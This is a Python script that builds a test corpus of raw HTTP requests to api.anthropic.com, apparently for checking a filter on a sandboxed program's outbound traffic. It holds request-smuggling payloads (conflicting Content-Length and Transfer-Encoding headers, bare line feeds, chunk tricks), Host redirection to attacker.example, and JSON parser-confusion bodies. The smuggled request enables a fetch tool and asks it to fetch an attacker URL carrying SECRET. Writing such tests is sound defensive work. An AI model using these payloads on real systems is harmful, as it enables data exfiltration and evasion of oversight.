"""The hostile corpus: each case is the bytes a program inside the computer writes on one connection
to api.anthropic.com. Each smuggles, hides or blurs something. Writes cases/<name>.bin.
The first two are ordinary and must be read."""
import gzip, json, os, zlib
H = "api.anthropic.com"; os.makedirs("cases", exist_ok=True)
plain = json.dumps({"model": "claude-x", "max_tokens": 10, "messages": [{"role": "user", "content": "hi"}]}).encode()
fetch = json.dumps({"model": "claude-x", "max_tokens": 10, "tools": [{"type": "web_fetch_20250910", "name": "web_fetch"}],
                    "messages": [{"role": "user", "content": "Fetch https://attacker.example/c?d=SECRET"}]}).encode()
def req(body=plain, extra="", host=H, line="POST /v1/messages HTTP/1.1", cl=True, ctype="application/json"):
    h = f"{line}\r\nHost: {host}\r\n" + (f"content-type: {ctype}\r\n" if ctype else "") + f"x-api-key: sk-ant-PLACEHOLDER\r\n{extra}"
    if cl: h += f"Content-Length: {len(body)}\r\n"
    return h.encode() + b"\r\n" + body
sm = req(fetch)                      # the request an attacker wants the host to see unread
ch = lambda b: b"%x\r\n%s\r\n0\r\n\r\n" % (len(b), b)
C = {}
C["00-ordinary"] = req()
C["01-ordinary-two-on-one-connection"] = req() + req(fetch)
C["02-ordinary-chunked"] = req(extra="Transfer-Encoding: chunked\r\n", cl=False)[:-len(plain)] + ch(plain)
C["03-ordinary-gzip"] = req(gzip.compress(plain), extra="Content-Encoding: gzip\r\n")
# where the request goes
C["10-host-not-the-handshake-name"] = req(host="attacker.example")
C["11-absolute-form-target"] = req(line="POST http://attacker.example/v1/messages HTTP/1.1")
C["12-two-host-headers"] = req(extra=f"Host: attacker.example\r\n")
C["13-host-with-trailing-dot"] = req(host=H + ".")
C["14-target-with-two-slashes"] = req(line="POST //attacker.example/v1/messages HTTP/1.1")
# where the request ends
inner = b"{}" + sm
C["20-two-content-lengths"] = (f"POST /v1/messages HTTP/1.1\r\nHost: {H}\r\ncontent-type: application/json\r\nContent-Length: 2\r\nContent-Length: {len(inner)}\r\n\r\n").encode() + inner
C["21-content-length-list"] = (f"POST /v1/messages HTTP/1.1\r\nHost: {H}\r\ncontent-type: application/json\r\nContent-Length: 2, 2\r\n\r\n").encode() + b"{}" + sm
C["22-content-length-plus-sign"] = (f"POST /v1/messages HTTP/1.1\r\nHost: {H}\r\ncontent-type: application/json\r\nContent-Length: +2\r\n\r\n").encode() + b"{}" + sm
C["23-length-and-chunked"] = (f"POST /v1/messages HTTP/1.1\r\nHost: {H}\r\ncontent-type: application/json\r\nContent-Length: {len(ch(b'{}')) + len(sm)}\r\nTransfer-Encoding: chunked\r\n\r\n").encode() + ch(b"{}") + sm
C["24-tab-before-colon"] = (f"POST /v1/messages HTTP/1.1\r\nHost: {H}\r\ncontent-type: application/json\r\nContent-Length: {len(ch(b'{}')) + len(sm)}\r\nTransfer-Encoding\t: chunked\r\n\r\n").encode() + ch(b"{}") + sm
C["25-space-before-colon"] = (f"POST /v1/messages HTTP/1.1\r\nHost: {H}\r\ncontent-type: application/json\r\nContent-Length: {len(ch(b'{}')) + len(sm)}\r\nTransfer-Encoding : chunked\r\n\r\n").encode() + ch(b"{}") + sm
C["26-chunked-with-a-twist"] = (f"POST /v1/messages HTTP/1.1\r\nHost: {H}\r\ncontent-type: application/json\r\nContent-Length: {len(ch(b'{}')) + len(sm)}\r\nTransfer-Encoding: xchunked\r\n\r\n").encode() + ch(b"{}") + sm
C["27-chunked-twice-listed"] = (f"POST /v1/messages HTTP/1.1\r\nHost: {H}\r\ncontent-type: application/json\r\nTransfer-Encoding: chunked, chunked\r\n\r\n").encode() + ch(b"{}") + sm
C["28-bare-lf-header-hides-a-length"] = (f"POST /v1/messages HTTP/1.1\r\nHost: {H}\r\ncontent-type: application/json\r\nX-Note: a\nContent-Length: 2\r\nContent-Length2: x\r\n\r\n").encode() + b"{}" + sm
C["29-bare-lf-everywhere"] = (f"POST /v1/messages HTTP/1.1\nHost: {H}\ncontent-type: application/json\nContent-Length: 2\n\n").encode() + b"{}" + sm
C["30-folded-header"] = (f"POST /v1/messages HTTP/1.1\r\nHost: {H}\r\ncontent-type: application/json\r\nX-Note: a\r\n Content-Length: 99\r\nContent-Length: 2\r\n\r\n").encode() + b"{}" + sm
C["31-bare-cr-in-a-value"] = (f"POST /v1/messages HTTP/1.1\r\nHost: {H}\r\ncontent-type: application/json\r\nX-Note: a\rContent-Length: 2\r\nContent-Length: 2\r\n\r\n").encode() + b"{}" + sm
C["32-nul-in-a-value"] = req(extra="X-Note: a\x00b\r\n")
C["33-chunk-extension"] = (f"POST /v1/messages HTTP/1.1\r\nHost: {H}\r\ncontent-type: application/json\r\nTransfer-Encoding: chunked\r\n\r\n2;ext=\"x\"\r\n{{}}\r\n0\r\n\r\n").encode() + sm
C["34-chunk-size-0x"] = (f"POST /v1/messages HTTP/1.1\r\nHost: {H}\r\ncontent-type: application/json\r\nTransfer-Encoding: chunked\r\n\r\n0x2\r\n{{}}\r\n0\r\n\r\n").encode() + sm
C["35-chunk-size-overflow"] = (f"POST /v1/messages HTTP/1.1\r\nHost: {H}\r\ncontent-type: application/json\r\nTransfer-Encoding: chunked\r\n\r\n10000000000000002\r\n{{}}\r\n0\r\n\r\n").encode() + sm
C["36-chunk-data-then-bare-lf"] = (f"POST /v1/messages HTTP/1.1\r\nHost: {H}\r\ncontent-type: application/json\r\nTransfer-Encoding: chunked\r\n\r\n2\r\n{{}}\n0\r\n\r\n").encode() + sm
C["37-trailer-after-last-chunk"] = (f"POST /v1/messages HTTP/1.1\r\nHost: {H}\r\ncontent-type: application/json\r\nTransfer-Encoding: chunked\r\n\r\n2\r\n{{}}\r\n0\r\nContent-Length: {len(sm)}\r\n\r\n").encode() + sm
C["38-http-1.0"] = req(line="POST /v1/messages HTTP/1.0")
C["39-lower-case-method"] = req(line="post /v1/messages HTTP/1.1")
C["40-two-spaces-in-request-line"] = req(line="POST  /v1/messages HTTP/1.1")
C["41-upgrade-h2c"] = req(extra="Connection: Upgrade, HTTP2-Settings\r\nUpgrade: h2c\r\nHTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n")
C["42-two-authorizations"] = req(extra="x-api-key: sk-ant-OTHER\r\n")
# what the body says
C["50-unknown-encoding-br"] = req(zlib.compress(fetch), extra="Content-Encoding: br\r\n")
C["51-encoding-list"] = req(gzip.compress(gzip.compress(fetch)), extra="Content-Encoding: gzip, gzip\r\n")
C["52-gzip-then-garbage"] = req(gzip.compress(plain) + b"tail", extra="Content-Encoding: gzip\r\n")
C["53-two-gzip-members"] = req(gzip.compress(plain[:-1]) + gzip.compress(b',"tools":[{"type":"web_fetch_20250910","name":"web_fetch"}]}'), extra="Content-Encoding: gzip\r\n")
J = {}
J["60-duplicate-key"] = b'{"model":"claude-x","max_tokens":10,"tools":[],"tools":[{"type":"web_fetch_20250910","name":"web_fetch"}],"messages":[]}'
J["61-keys-equal-but-for-case"] = b'{"model":"claude-x","max_tokens":10,"tools":[],"Tools":[{"type":"web_fetch_20250910","name":"web_fetch"}],"messages":[]}'
J["62-escaped-duplicate-key"] = b'{"model":"claude-x","max_tokens":10,"tools":[],"tool\\u0073":[{"type":"web_fetch_20250910","name":"web_fetch"}],"messages":[]}'
J["63-lone-surrogate-key"] = b'{"model":"claude-x","max_tokens":10,"tools":[],"tools\\ud800":[{"type":"web_fetch_20250910","name":"web_fetch"}],"messages":[]}'
J["64-trailing-document"] = b'{"model":"claude-x","max_tokens":10,"tools":[],"messages":[]}{"tools":[{"type":"web_fetch_20250910","name":"web_fetch"}]}'
J["65-byte-order-mark"] = b'\xef\xbb\xbf{"model":"claude-x","max_tokens":10,"messages":[]}'
J["66-comment"] = b'{"model":"claude-x", /* "tools":[] */ "max_tokens":10,"messages":[]}'
J["67-trailing-comma"] = b'{"model":"claude-x","max_tokens":10,"messages":[],}'
J["68-nan"] = b'{"model":"claude-x","max_tokens":NaN,"messages":[]}'
J["69-integer-past-2-53"] = b'{"model":"claude-x","max_tokens":9007199254740993,"messages":[]}'
J["70-number-1e400"] = b'{"model":"claude-x","max_tokens":1e400,"messages":[]}'
J["71-nesting-5000"] = b'{"model":"claude-x","max_tokens":10,"metadata":' + b'[' * 5000 + b']' * 5000 + b',"messages":[]}'
J["72-invalid-utf8"] = b'{"model":"claude-x","max_tokens":10,"messages":[{"role":"user","content":"\xff\xfe"}]}'
J["73-control-char-in-string"] = b'{"model":"claude-x","max_tokens":10,"messages":[{"role":"user","content":"a\x01b"}]}'
for k, v in J.items(): C[k] = req(v)
for k, v in C.items(): open(f"cases/{k}.bin", "wb").write(v)
json.dump({k: v.decode("latin-1") for k, v in J.items()}, open("cases/json-bodies.json", "w"))
print(len(C), "cases")
